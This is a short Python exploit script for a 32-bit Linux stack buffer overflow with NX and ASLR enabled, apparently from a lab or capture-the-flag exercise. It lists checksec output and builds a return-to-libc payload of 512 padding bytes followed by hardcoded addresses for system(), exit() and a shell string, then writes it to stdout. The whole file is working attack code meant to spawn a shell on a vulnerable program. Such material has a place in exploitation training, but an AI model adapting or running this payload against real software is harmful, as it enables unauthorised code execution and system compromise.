#!/usr/bin/env python3
# Linux Buffer Overflow 32 bits NX & ASLR enabled
# Without pwntools

# Checksec

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

# /proc/sys/kernel/randomize_va_space 2

import sys
import struct

libc = 0xf75b8000
system = struct.pack("<I", libc + 0x0003a940)
exit = struct.pack("<I", libc + 0x0002e7b0)
sh = struct.pack("<I", libc + 0x15900b)

payload = b"A" * 512 + system + exit + sh
# print(payload)
sys.stdout.buffer.write(payload)
